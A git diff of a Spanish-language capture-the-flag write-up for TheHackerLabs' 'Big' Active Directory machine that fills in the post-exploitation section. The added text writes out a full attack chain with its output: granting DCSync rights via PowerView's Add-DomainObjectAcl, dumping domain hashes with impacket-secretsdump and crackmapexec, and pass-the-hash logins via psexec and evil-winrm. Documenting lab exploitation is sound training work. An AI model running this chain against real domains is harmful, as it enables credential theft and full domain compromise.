@@ -1,11 +1,11 @@
 ---
 layout: single
 title: Big - TheHackerLabs
-excerpt: "."
-date: 2025-04-17
+excerpt: "Esta fue una máquina lo suficientemente difícil. Después de analizar el escaneo de servicios, empezamos revisando la página web, que al no encontrar nada, aplicamos Fuzzing a directorios web, en donde encontraremos algunos que contienen imágenes, letras de canciones (entre ellas un wordlist) y un mensaje de un usuario que resulta ser una pista. Enumeramos los usuarios del servicio Kerberos con kerbrute y aplicamos fuerza bruta al servicio SMB, utilizando el wordlist encontrado, siendo así que encontramos la contraseña de un usuario. Esto nos permite loguearnos al servicio WinRM con evil-winrm. Además, aplicamos el AS-REP Roasting attack, logrando crackear el hash krb5asrep que resultó ser del mismo usuario al que obtuvimos su contraseña con la fuerza bruta al SMB. También aplicamos estegoanalisis a las imágenes encontradas, resultando en encontrar y obtener un archivo que contiene la contraseña de otro usuario. Para terminar, analizamos el AD con SharpHound v1.1.1 y BloodHound Community Edition, descubriendo que nuestro primero usuario obtenido, pertenece al grupo ACCOUNT OPERATORS, que a su vez, tiene el permiso GenericAll sobre un grupo personalizado llamado SPECIAL PERMISSIONS, siendo que este grupo puede cambiar el permiso DACL del dominio, con lo que podemos aplicar el DCSync Attack y así  logramos escalar privilegios."
+date: 2025-04-18
 classes: wide
 header:
-  teaser: /assets/images/THL-writeup-big/_logo.png
+  teaser: /assets/images/THL-writeup-big/big.png
   teaser_home_page: true
   icon: /assets/images/thehackerlabs.jpeg
 categories:
@@ -16,6 +16,7 @@ tags:
   - Active Directory
   - Kerberos
   - SMB
+  - LDAP
   - WinRM
   - Web Enumeration
   - Fuzzing
@@ -24,20 +25,16 @@ tags:
   - AS-REP Roasting Attack
   - Cracking Hash
   - Steganalysis
-  - 
-  - 
-  - 
-  - 
-  - 
-  - 
-  - 
-  - 
-  - 
+  - SharpHound and BloodHound Enumeration
+  - DCSync Attack
+  - Privesc - DCSync Attack
   - OSCP Style
 ---
-![](/assets/images/THL-writeup-big/_logo.png)
+<p align="center">
+<img src="/assets/images/THL-writeup-big/big.png">
+</p>
 
-texto
+Esta fue una máquina lo suficientemente difícil. Después de analizar el escaneo de servicios, empezamos revisando la página web, que al no encontrar nada, aplicamos **Fuzzing** a directorios web, en donde encontraremos algunos que contienen imágenes, letras de canciones (entre ellas un wordlist) y un mensaje de un usuario que resulta ser una pista. Enumeramos los usuarios del **servicio Kerberos** con **kerbrute** y aplicamos fuerza bruta al **servicio SMB**, utilizando el wordlist encontrado, siendo así que encontamos la contraseña de un usuario. Esto nos permite loguearnos al **servicio WinRM** con **evil-winrm**. Además, aplicamos el **AS-REP Roasting attack**, logrando crackear el **hash krb5asrep** que resultó ser del mismo usuario al que obtuvimos su contraseña con la **fuerza bruta al SMB**. También aplicamos **estegoanálisis** a las imágenes encontradas, resultando en encontrar y obtener un archivo que contiene la contraseña de otro usuario. Para terminar, analizamos el **AD** con **SharpHound v1.1.1** y **BloodHound Community Edition**, descubriendo que nuestro primero usuario obtenido, pertenece al **grupo ACCOUNT OPERATORS**, que a su vez, tiene el **permiso GenericAll** sobre un grupo personalizado llamado **SPECIAL PERMISSIONS**, siendo que este grupo puede cambiar el **permiso DACL** del dominio, con lo que podemos aplicar el **DCSync Attack** y así logramos escalar privilegios.
 
 Herramientas utilizadas:
 * *ping*
@@ -65,17 +62,13 @@ Herramientas utilizadas:
 * *md5sum*
 * *awk*
 * *echo*
-* **
-* **
-* **
-* **
-* **
-* **
-* **
-* **
-* **
-* **
-* **
+* *SharpHound v1.1.1*
+* *BloodHound Community Edition*
+* *PowerView.ps1*
+* *net group*
+* *whoami*
+* *impacket-secretsdump*
+* *impacket-psexec*
 
 
 <br>
@@ -112,9 +105,8 @@ Herramientas utilizadas:
 			</ul>
 		<li><a href="#Post">Post Explotación</a></li>
 			<ul>
-				<li><a href="#"></a></li>
-				<li><a href="#"></a></li>
-				<li><a href="#"></a></li>
+				<li><a href="#BloodHound">Enumeración de AD con BloodHound y SharpHound</a></li>
+				<li><a href="#DCSyncAttack">Aplicando DCSync Attack con PowerView</a></li>
 			</ul>
 		<li><a href="#Links">Links de Investigación</a></li>
 	</ul>
@@ -748,7 +740,7 @@ Using default input encoding: UTF-8
 Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 SSE2 4x])
 Will run 6 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-Passwordsave@    ($krb5asrep$23$song@BBR.THL)     
+******    ($krb5asrep$23$song@BBR.THL)     
 1g 0:00:00:00 DONE (2025-04-17 16:06) 33.33g/s 6700p/s 6700c/s 6700C/s 123456..qwerty123456
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
@@ -762,7 +754,7 @@ hashcat (v6.2.6) starting
 ...
 ...
 ...
-$krb5asrep$23$song@BBR.THL:03ca8e428eb7f65eed7f026ca8332ca6$ae9da9376d8....:******
+$krb5asrep$23$song@BBR.THL:03ca8e428eb7f65eed7f026ca8332ca6$ae9da....:******
 
 Session..........: hashcat
 Status...........: Cracked
@@ -830,6 +822,9 @@ Vamos a copiar todos esos archivos de texto, saquemos las oraciones y luego tran
 
 Primero, descarguemos los archivos de texto:
 ```bash
+mkdir canciones
+cd canciones
+.
 wget -r -l1 -nd -A txt http://192.168.212.4/songs
 --2025-04-17 19:39:49--  http://192.168.212.4/songs
 Conectando con 192.168.212.4:80... conectado.
@@ -850,7 +845,7 @@ Tiempo total de reloj: 0.05s
 Descargados: 6 ficheros, 14K en 0s (384 MB/s)
 ```
 
-Una vez que los tenemos descargados, vamos a sacar las oraciones y a transformarlas en **hashes MD5**:
+Una vez que los tenemos descargados, vamos a sacar las oraciones y a transformarlas en **hashes MD5** con el siguiente oneliner:
 ```bash
 cat *.txt | grep -v '^$' | while read linea; do echo -n "$linea" | md5sum | awk '{print $1}'; done > hashes.txt
 ```
@@ -979,13 +974,10 @@ Sí sirve.
 Vamos a autenticarnos con este usuario:
 ```batch
 evil-winrm -i 192.168.212.4 -u 'music' -p '******'
-                                        
 Evil-WinRM shell v3.7
-                                        
 Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
-                                        
 Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-                                        
+.                                        
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\TEMP\Documents> whoami
 bbr\music
@@ -1024,7 +1016,7 @@ Con esto hecho, ya tenemos la contraseña de 2 usuarios.
 
 Analizando ambos usuarios, parece que el **usuario song** tiene más privilegios que el **usuario music**.
 
-Observa los privilegios del **usuario song**
+Observa los privilegios del **usuario song**:
 ```batch
 *Evil-WinRM* PS C:\Users\TEMP.bbr\Documents> whoami /priv
 
@@ -1044,7 +1036,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
 SeTimeZonePrivilege           Change the time zone                Enabled
 ```
 
-Comparalo con el **usuario music**:
+Compáralo con el **usuario music**:
 ```batch
 *Evil-WinRM* PS C:\Users\Music\Documents> whoami /priv
 
@@ -1080,9 +1072,15 @@ bbr\Privilege users                        Group            S-1-5-21-1487034055-
 NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
 Mandatory Label\High Mandatory Level       Label            S-1-16-12288
 ```
-Me llama mucho la atención que este usuario este en el grupo **Account Operatons y Privilige Users**.
+Me llama mucho la atención que este usuario este en el grupo **Account Operators**.
 
-EXPLICACION DE ESTOS GRUPOS
+| **Grupo Account Operators** |
+|:-----------:|
+| *Es un grupo predefinido que tiene permisos específicos relacionados con la gestión de cuentas de usuario y grupo dentro de un dominio. Este grupo se usa principalmente para delegar tareas administrativas limitadas sin otorgar privilegios de administrador completo.* |
+
+<br>
+
+Quizá nos ayude estar dentro de este grupo más adelante.
 
 Para esta máquina, utilizaremos **BloodHound Community Edition y SharpHound v1.1.1**.
 
@@ -1092,7 +1090,7 @@ Este blog enseña como instalar **BloodHound Community Edition** y como usarlo:
 Y de aquí puedes conseguir **SharpHound v1.1.1**:
 * <a href="https://github.com/SpecterOps/SharpHound/releases/tag/v1.1.1" target="_blank">Repositorio de SpecterOps: SharpHound v1.1.1</a>
 
-Carguémos **SharpHound** a la sesión de **evil-winrm** del **usuario song** y trabajemos con este usuario de ahora en adelante:
+Carguemos **SharpHound** a la sesión de **evil-winrm** del **usuario song** y trabajemos con este usuario de ahora en adelante:
 ```batch
 *Evil-WinRM* PS C:\Users\Music\Desktop> upload SharpHoundV1.exe
 Info: Uploading /../TheHackersLabs/Big/content/sharphoundV1.1.1/SharpHoundV1.exe to C:\Users\Music\Desktop\SharpHoundV1.exe
@@ -1100,7 +1098,7 @@ Data: 1402880 bytes of 1402880 bytes copied
 Info: Upload successful!
 ```
 
-Bien, ahora usemoslo y descarguemos el **archivo ZIP** resultante:
+Bien, ahora usémoslo y descarguemos el **archivo ZIP** resultante:
 ```batch
 *Evil-WinRM* PS C:\Users\Music\Desktop> .\SharpHoundV1.exe -c All
 2025-04-17T21:49:39.2957598-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
@@ -1129,7 +1127,7 @@ Ya podemos cargar este archivo al **BloodHound** y lo primero que haremos será 
 
 Podemos ver más claramente a los grupos que pertenece, y ahí vemos al grupo **Account Operators**.
 
-Además, observa que buscando las cuentas que sean vulnerables al **AS-REP Roasting Attack**, sale este usuario:
+Además, observa que buscando las cuentas que sean vulnerables al **AS-REP Roasting Attack**, sale nuestro usuario:
 
 <p align="center">
 <img src="/assets/images/THL-writeup-big/Captura10.png">
@@ -1141,11 +1139,9 @@ Analizando un poco más, observa lo que podemos ver en las rutas cortas a los si
 <img src="/assets/images/THL-writeup-big/Captura11.png">
 </p>
 
-Parece que tenemos el **permiso GenericAll** para el **grupo Special Permissions**.
+Parece que tenemos el **permiso GenericAll** para el **grupo Special Permissions**. Y aunque busque información sobre este grupo, parece que es un grupo personalizado para asignar permisos especiales a los usuarios.
 
-EXPLICACIÓN DE GRUPO SPECIAL PERMISSION
-
-Viendo las rutas cortas para los administradores de dominio, vemos que el **grupo Special Permissions**, tiene el **permiso de modificar el DACL** del **contenedor USERS**, que a su vez se relaciona con el dominio completo:
+Viendo las **"rutas cortas para los administradores de dominio"**, vemos que el **grupo Special Permissions**, tiene el **permiso de modificar el DACL** del **contenedor USERS**, que a su vez se relaciona con el dominio completo:
 
 <p align="center">
 <img src="/assets/images/THL-writeup-big/Captura12.png">
@@ -1153,7 +1149,7 @@ Viendo las rutas cortas para los administradores de dominio, vemos que el **grup
 
 Esto ya nos da una idea de que puede ser vulnerable.
 
-Para terminar, si vemos las rutas cortas de los objetos propios, encontramos que el **grupo Special Permissions** tiene el **permiso de modificar el DACL**, lo que nos permitiría aplicar el **DCSync Attack**:
+Para terminar, si vemos las **"rutas cortas de los objetos propios"**, encontramos que el **grupo Special Permissions** tiene el **permiso de modificar el DACL** del dominio, lo que nos permitiría aplicar el **DCSync Attack**:
 
 <p align="center">
 <img src="/assets/images/THL-writeup-big/Captura13.png">
@@ -1165,44 +1161,181 @@ Para terminar, si vemos las rutas cortas de los objetos propios, encontramos que
 
 <br>
 
-<h2 id="">Aplicando DCSync Attack con PowerView</h2>
+<h2 id="DCSyncAttack">Aplicando DCSync Attack con PowerView</h2>
 
+Veamos rápidamente de que va este ataque:
 
+| **DCSync Attack** |
+|:-----------:|
+| *El ataque DCSync es una técnica utilizada por atacantes dentro de un dominio de Active Directory (AD) para extraer credenciales (incluyendo hashes de contraseñas de usuarios, administradores e incluso del krbtgt) directamente desde el controlador de dominio (Domain Controller), sin necesidad de acceso físico al mismo. El ataque DCSync simula el comportamiento de un controlador de dominio (DC) legítimo solicitando replicación de objetos del directorio. En otras palabras, el atacante finge ser otro controlador de dominio y solicita los datos del AD, como si estuviera sincronizándose con el resto del dominio.* |
+
+<br>
+
+Para este ataque, necesitamos la herramienta **PowerView** que puedes descargar aquí:
 * <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" target="_blank">Repositorio de PowerShellMafia: PowerView.ps1</a>
 
-
-```bash
+Una vez que lo descargues, súbelo a la sesión de **evil-winrm**:
+```batch
 *Evil-WinRM* PS C:\Users\song\Desktop> upload PowerView.ps1
-Info: Uploading /home/berserkwings/Escritorio/TheHackersLabs/Big/content/post/PowerView.ps1 to C:\Users\song\Desktop\PowerView.ps1
+Info: Uploading /../TheHackersLabs/Big/content/post/PowerView.ps1 to C:\Users\song\Desktop\PowerView.ps1
 Data: 1027036 bytes of 1027036 bytes copied
 Info: Upload successful!
 ```
 
+Carga el **PowerView** como módulo a la sesión:
+```batch
+*Evil-WinRM* PS C:\Users\song\Desktop> Import-Module .\PowerView.ps1
+```
+Ahora bien, en la descripción del **permiso WriteDacl**, ya nos dan los pasos que debemos seguir.
 
-```bash
-
+Para empezar, debemos ser miembros del **grupo Special Permissions**, siendo que podemos agregarnos de estas dos maneras:
+```batch
+net group "Special Permissions" song /add /domain
+.
+Add-ADGroupMember -Identity "Special Permissions" -Members "song"
 ```
 
-```bash
+Si salimos de la sesión y volvemos a entrar, ya nos debería aparecer que estamos dentro de ese grupo:
+```batch
+*Evil-WinRM* PS C:\Users\song\Desktop> whoami /groups
 
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                           Attributes
+========================================== ================ ============================================= ==================================================
+Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Account Operators                  Alias            S-1-5-32-548                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Server Operators                   Alias            S-1-5-32-549                                  Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
+bbr\Special Permissions                    Group            S-1-5-21-1487034055-435569681-4283575489-1108 Mandatory group, Enabled by default, Enabled group
+bbr\Privilege users                        Group            S-1-5-21-1487034055-435569681-4283575489-1107 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level       Label            S-1-16-12288
 ```
 
-<br>
+Ahora, seguimos los pasos que nos indican:
+* Convertir la contraseña de nuestro usuario en un objeto **SecureString** para convertirla en una contraseña "segura".
+* Crear el **objeto PSCredential**, agregándole el dominio, nuestro usuario y la contraseña segura.
+* Modificar los **permisos del ACL** con el **comando Add-DomainObjectAcl** del **módulo PowerView.ps1**, para darle los mismos privilegios que tiene el dominio a nuestro **usuario song** y pueda replicar **objetos del AD** (**incluyendo los hashes**).
 
-<h2 id=""></h2>
+Apliquémoslo:
+```batch
+*Evil-WinRM* PS C:\Users\song\Desktop> $SecPassword = ConvertTo-SecureString 'contraseña_de_usuario_song' -AsPlainText -Force
+*Evil-WinRM* PS C:\Users\song\Desktop> $Cred = New-Object System.Management.Automation.PSCredential('bbr.thl\song', $SecPassword)
+*Evil-WinRM* PS C:\Users\song\Desktop> Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=bbr,DC=thl" -PrincipalIdentity song -Rights DCSync
+```
+Solamente modificamos el último paso, ya que se debe especificar el dominio para que funcione bien.
 
+Con todo esto listo, ya deberíamos poder dumpear los hashes de la máquina víctima:
 ```bash
+impacket-secretsdump bbr.thl/song@192.168.212.4
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
+Password:
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:5d48bcf84aea999fb1ade06970a81237:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a0b3723455bd8be604ae2e1df74db81b:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+bbr.thl\Music:1103:aad3b435b51404eeaad3b435b51404ee:8ab1d3828490421d0dc1ddd6e2552d90:::
+bbr.thl\song:1104:aad3b435b51404eeaad3b435b51404ee:5919764374e465e68f886ac0c4f75ab3:::
+BIG$:1000:aad3b435b51404eeaad3b435b51404ee:0f7d9f62a1d1fdfb48aecc7f2663824e:::
+...
+...
+```
+Excelente, tenemos los hashes.
+
+Podemos comprobar si funcionan los del **usuario administrator** con **crackmapexec**:
+```bash
+crackmapexec smb 192.168.212.4 -u "administrator" -H "5d48bcf84aea999fb1ade06970a81237"
+SMB         192.168.212.4   445    BIG              [*] Windows 10 / Server 2016 Build 14393 x64 (name:BIG) (domain:bbr.thl) (signing:True) (SMBv1:False)
+SMB         192.168.212.4   445    BIG              [+] bbr.thl\administrator:5d48bcf84aea999fb1ade06970a81237 (Pwn3d!)
+
+crackmapexec smb 192.168.212.4 -u "administrator" -H "aad3b435b51404eeaad3b435b51404ee:5d48bcf84aea999fb1ade06970a81237"
+SMB         192.168.212.4   445    BIG              [*] Windows 10 / Server 2016 Build 14393 x64 (name:BIG) (domain:bbr.thl) (signing:True) (SMBv1:False)
+SMB         192.168.212.4   445    BIG              [+] bbr.thl\administrator:5d48bcf84aea999fb1ade06970a81237 (Pwn3d!)
+```
+Tanto el **hash NTML**, como el **hash NT** funcionan para **SMB**.
+
+Pero solamente el **hash NT** funciona para el **servicio WinRM**:
+```bash
+crackmapexec winrm 192.168.212.4 -u "administrator" -H "5d48bcf84aea999fb1ade06970a81237"
+SMB         192.168.212.4   5985   BIG              [*] Windows 10 / Server 2016 Build 14393 (name:BIG) (domain:bbr.thl)
+HTTP        192.168.212.4   5985   BIG              [*] http://192.168.212.4:5985/wsman
+WINRM       192.168.212.4   5985   BIG              [+] bbr.thl\administrator:5d48bcf84aea999fb1ade06970a81237 (Pwn3d!)
 ```
 
+Con el **hash NTLM** del administrador, podemos indicarle a **crackmapexec** que realice una copia de la **base de datos NTDS.dit** (que almacena las cuentas de usuario y sus hashes de contraseñas en **Active Directory**) utilizando la técnica de **Volume Shadow Copy Service (VSS)**:
 ```bash
+crackmapexec smb 192.168.212.4 -u "administrator" -H "aad3b435b51404eeaad3b435b51404ee:5d48bcf84aea999fb1ade06970a81237" --ntds vss
+SMB         192.168.212.4   445    BIG              [*] Windows 10 / Server 2016 Build 14393 x64 (name:BIG) (domain:bbr.thl) (signing:True) (SMBv1:False)
+SMB         192.168.212.4   445    BIG              [+] bbr.thl\administrator:5d48bcf84aea999fb1ade06970a81237 (Pwn3d!)
+SMB         192.168.212.4   445    BIG              [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         192.168.212.4   445    BIG              Administrator:500:aad3b435b51404eeaad3b435b51404ee:5d48bcf84aea999fb1ade06970a81237:::
+SMB         192.168.212.4   445    BIG              Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         192.168.212.4   445    BIG              DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         192.168.212.4   445    BIG              BIG$:1000:aad3b435b51404eeaad3b435b51404ee:0f7d9f62a1d1fdfb48aecc7f2663824e:::
+SMB         192.168.212.4   445    BIG              krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a0b3723455bd8be604ae2e1df74db81b:::
+SMB         192.168.212.4   445    BIG              bbr.thl\Music:1103:aad3b435b51404eeaad3b435b51404ee:8ab1d3828490421d0dc1ddd6e2552d90:::
+SMB         192.168.212.4   445    BIG              bbr.thl\song:1104:aad3b435b51404eeaad3b435b51404ee:5919764374e465e68f886ac0c4f75ab3:::
+SMB         192.168.212.4   445    BIG              [+] Dumped 7 NTDS hashes to /root/.cme/logs/BIG_192.168.212.4_2025-04-18_134853.ntds of which 6 were added to the database
+```
+Listo, ya solo queda autenticarnos como el administrador aplicando el **movimiento lateral Pass-The-Hash**.
 
+Vamos a hacerlo con **impacket-psexec**:
+```batch
+impacket-psexec "bbr.thl/administrator"@192.168.212.4 -hashes aad3b435b51404eeaad3b435b51404ee:5d48bcf84aea999fb1ade06970a81237
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on 192.168.212.4.....
+[*] Found writable share ADMIN$
+[*] Uploading file NwJJoLhv.exe
+[*] Opening SVCManager on 192.168.212.4.....
+[*] Creating service depx on 192.168.212.4.....
+[*] Starting service depx.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
 ```
 
-```bash
-
+Y por último con **evil-winrm**:
+```batch
+evil-winrm -i 192.168.212.4 -u 'administrator' -H '5d48bcf84aea999fb1ade06970a81237'
+Evil-WinRM shell v3.7
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+.                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+bbr\administrator
 ```
 
+Solamente buscamos la última flag que nos falta:
+```batch
+*Evil-WinRM* PS C:\Users\Administrator\Documents> dir
+
+    Directory: C:\Users\Administrator\Documents
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        4/30/2024   5:05 AM             32 root.txt
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> type root.txt
+...
+```
+Y con esto terminamos la máquina.
 
 
 <br>
@@ -1222,6 +1355,7 @@ Info: Upload successful!
 * https://github.com/SpecterOps/SharpHound/releases/tag/v1.1.1
 * https://m4lwhere.medium.com/the-ultimate-guide-for-bloodhound-community-edition-bhce-80b574595acf
 * https://nordvpn.com/cybersecurity/glossary/steganalysis/
+* https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/dcsync.html?highlight=dcsync%20attack#dcsync-1
 
 
 <br>
